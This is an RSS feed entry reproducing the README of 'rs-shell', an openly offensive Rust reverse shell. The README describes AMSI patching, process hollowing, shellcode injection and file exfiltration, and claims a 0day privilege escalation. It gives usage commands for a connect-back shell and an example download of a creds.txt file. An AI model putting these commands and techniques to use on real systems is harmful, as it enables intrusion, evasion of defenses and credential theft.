<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Rust Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-06-25T01:46:57Z</updated>
  <subtitle>Daily Trending of Rust in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>BlWasp/rs-shell</title>
    <updated>2023-06-25T01:46:57Z</updated>
    <id>tag:github.com,2023-06-25:/BlWasp/rs-shell</id>
    <link href="https://github.com/BlWasp/rs-shell" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A dirty PoC for a reverse shell with cool features in Rust&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;em&gt;&#34;The worst Rust programmer you have ever seen&#34;&lt;/em&gt; - my mom&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;&#34;But at least it works&#34;&lt;/em&gt; - still my mom, but not about me&lt;/p&gt; &#xA;&lt;h1&gt;RS-Shell&lt;/h1&gt; &#xA;&lt;p&gt;RS-Shell is a TLS over TCP reverse shell developped in Rust with client and server embedded in the same binary. This project has been mainly started to learn Rust with a tool that could help me in my work, and the code quality could be greatly improved.&lt;/p&gt; &#xA;&lt;p&gt;Client and server are both cross-platform and work on Windows and Linux systems.&lt;/p&gt; &#xA;&lt;p&gt;For Windows client, additonal features have been integrated for offensive purpose, and they will be improved in futur commits.&lt;/p&gt; &#xA;&lt;p&gt;For this purpose, I have chosen to mainly use the official &lt;a href=&#34;https://docs.rs/windows-sys/latest/windows_sys/&#34;&gt;windows_sys&lt;/a&gt; crate to interact with the Win32API and the &lt;a href=&#34;https://docs.rs/ntapi/latest/ntapi/&#34;&gt;ntapi&lt;/a&gt; crate for the NTAPI.&lt;/p&gt; &#xA;&lt;p&gt;The project is thought in module. This means that you can easily add or remove features to and from it, and you can also easily take parts from it to put them in your own project.&lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;p&gt;For the moment, the following features are present:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Semi-interactive reverse shell via TLS over TCP&lt;/li&gt; &#xA; &lt;li&gt;File upload and download between server and client&lt;/li&gt; &#xA; &lt;li&gt;Start a PowerShell interactive session with the ability to patch the AMSI in memory&lt;/li&gt; &#xA; &lt;li&gt;Loading features : &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Load and execute a PE in the client memory&lt;/li&gt; &#xA;   &lt;li&gt;Load and execute a PE in a remote process memory&lt;/li&gt; &#xA;   &lt;li&gt;Load and execute a shellcode in a remote process memory&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Autopwn the client machine and elevate the privileges to SYSTEM or root by exploiting a 0day in &lt;code&gt;tcpdump&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;How to&lt;/h2&gt; &#xA;&lt;h3&gt;Setup&lt;/h3&gt; &#xA;&lt;p&gt;First of all, the full path of your TLS certificate and its password must be configured in the file &lt;code&gt;server.rs&lt;/code&gt; in place of the tags &lt;code&gt;[CERTFICATE_PATH]&lt;/code&gt; and &lt;code&gt;[CERTIFICATE_PASSWORD]&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Additionally, I have set a &lt;code&gt;dummy&lt;/code&gt; domain for hostname validation in the &lt;code&gt;connect()&lt;/code&gt; function for both clients. If you use a signed certificate for a real server, you can change it and remove the unsecure functions that remove hostname and certs validations.&lt;/p&gt; &#xA;&lt;p&gt;By default, only the &lt;code&gt;error&lt;/code&gt;, &lt;code&gt;warn&lt;/code&gt; and &lt;code&gt;info&lt;/code&gt; logs are displayed. If you also need the &lt;code&gt;debug&lt;/code&gt; ones (can be usefull for the loading features), you can change this in &lt;code&gt;main.rs&lt;/code&gt; by modifying &lt;code&gt;::log::set_max_level(LevelFilter::Info);&lt;/code&gt; to &lt;code&gt;::log::set_max_level(LevelFilter::Debug);&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Compilation&lt;/h3&gt; &#xA;&lt;p&gt;The project can be compiled with &lt;code&gt;cargo build --release&lt;/code&gt; on Windows or Linux and the binary will be present in &lt;code&gt;target/release/&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Tu compile for a different target than your current OS you can use &lt;code&gt;cargo build --release --target x86_64-unknown-linux-gnu&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The project compilation has been tested with the following Rust toolchains :&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;stable-x86_64-pc-windows-gnu&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;stable-x86_64-pc-windows-msvc&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;stable-x86_64-unknown-linux-gnu&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;If you compile the project for a Linux target, the &#34;Windows features&#34; will be removed at compilation. Should run on all Windows and Linux versions (I have hope).&lt;/p&gt; &#xA;&lt;h3&gt;Usage&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-plain&#34;&gt;Usage : shell.exe [l | c] IP port&#xA;&#xA;    l       launch the listener application&#xA;    c       launch the client application&#xA;&#xA;    IP      IP address to bind to for the listener, or to connect to for the client&#xA;    port    port address to bind to for the listener, or to connect to for the client&#xA;&#xA;    In a session, type &#39;help&#39; for advanced integrated commands&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To obtain a session, just launch the binary in listener mode on your machine with &lt;code&gt;rs-shell.exe l IP_to_bind_to port_to_bind_to&lt;/code&gt;. For example &lt;code&gt;rs-shell.exe l 0.0.0.0 4545&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Then, on the target machine launch the client to connect back to your server with &lt;code&gt;rs-shell.exe c IP_to_connect_to port_to_connect_to&lt;/code&gt;. For example &lt;code&gt;rs-shell.exe c 192.168.1.10 4545&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Advanced commands&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-plain&#34;&gt;&amp;gt; help&#xA;[+] Custom integrated commands :&#xA;&#xA;    [+] Loading commands&#xA;    &amp;gt; load C:\path\to\PE_to_load&#xA;        load a PE file in the client process memory and executes it. This could kill the reverse shell !&#xA;    &amp;gt; load -h C:\path\to\PE_to_load C:\path\to\PE_to_hollow&#xA;        load a PE file in a remote process memory with process hollowing and executes it&#xA;    &amp;gt; load -s C:\path\to\shellcode.bin C:\path\to\PE_to_execute&#xA;        load a shellcode in a remote process memory and start a new thread with it&#xA;&#xA;    [+] Bypass commands&#xA;    &amp;gt; powpow&#xA;        start a new interactive PowerShell session with the AMSI patched in memory&#xA;&#xA;    [+] Network commands&#xA;    &amp;gt; download C:\file\to\download C:\local\path&#xA;        download a file from the remote system&#xA;    &amp;gt; upload C:\local\file\to\upload C:\remote\path\to\write&#xA;        upload a file to the remote system&#xA;&#xA;    [+] Special commands&#xA;    &amp;gt; autopwn&#xA;        escalate to the SYSTEM account from any local account by exploiting a zero day&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The &lt;code&gt;load&lt;/code&gt; commands permit to load and execute directly in memory:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;load&lt;/code&gt; loads and execute a PE in the client memory. This will kill the reverse shell, but that could be usefull to launch a C2 implant in the current process for example&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;load -h&lt;/code&gt; loads and execute a PE in a created remote process memory with process hollowing. You don&#39;t lose your reverse shell session, but the process hollowing will be potentially flag by the AV or the EDR&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;load -s&lt;/code&gt; loads and execute a shellcode from a &lt;code&gt;.bin&lt;/code&gt; file in a created remote process memory. You don&#39;t lose your reverse shell session, and you don&#39;t have to drop the bin file on the target, since the shellcode will be transfered to the target via the TCP tunnel&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;For example : &lt;code&gt;&amp;gt; load -h C:\Windows\System32\calc.exe C:\Windows\System32\cmd.exe&lt;/code&gt;. This will start a &lt;code&gt;cmd.exe&lt;/code&gt; process with hollowing, load a &lt;code&gt;calc.exe&lt;/code&gt; image in the process memory, and then resume the thread to execute the calc.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;powpow&lt;/code&gt; starts an interactive PowerShell session with a PowerShell process where the AMSI &lt;code&gt;ScanBuffer&lt;/code&gt; function has been patched in memory. This feature is not particularly opsec.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;download&lt;/code&gt; permits to download a file from the client to the machine where the listener is running. For example &lt;code&gt;download C:\Users\Administrator\Desktop\creds.txt ./creds.txt&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;upload&lt;/code&gt; permits to upload a file on the client machine. For example &lt;code&gt;upload ./pwn.exe C:\Temp\pwn.exe&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;autopwn&lt;/code&gt; permits to escalate to the &lt;strong&gt;SYSTEM account&lt;/strong&gt; with a 0day exploitation. Just type &lt;code&gt;autopwn&lt;/code&gt; and answer the question.&lt;/p&gt; &#xA;&lt;h2&gt;Todo&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; Move all the Win32API related commands to the NTAPI with indirect syscalls&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; Implement other injection techniques&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; Implement a port forwarding solution&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; Find a way to create a fully proxy aware client&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; Implement a reverse socks proxy feature&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Acknowledgements&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/winsecurity/Offensive-Rust&#34;&gt;OffensiveRust&lt;/a&gt; by &lt;a href=&#34;https://github.com/winsecurity&#34;&gt;winsecurity&lt;/a&gt;. This project would never have existed without him. Many of functions, structures, and tricks present in &lt;code&gt;rs-shell&lt;/code&gt; come from this project&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/trickster0/OffensiveRust&#34;&gt;OffensiveRust&lt;/a&gt; by &lt;a href=&#34;https://github.com/trickster0&#34;&gt;trickster0&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Multiple projects by &lt;a href=&#34;https://github.com/memN0ps&#34;&gt;memN0ps&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Nariod/RustPacker&#34;&gt;RustPacker&lt;/a&gt; by &lt;a href=&#34;https://github.com/Nariod&#34;&gt;Nariod&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Nik Brendler&#39;s blog posts about pipe communication between process in Rust. &lt;a href=&#34;https://www.nikbrendler.com/rust-process-communication/&#34;&gt;Part 1&lt;/a&gt; and &lt;a href=&#34;https://www.nikbrendler.com/rust-process-communication-part-2/&#34;&gt;Part 2&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>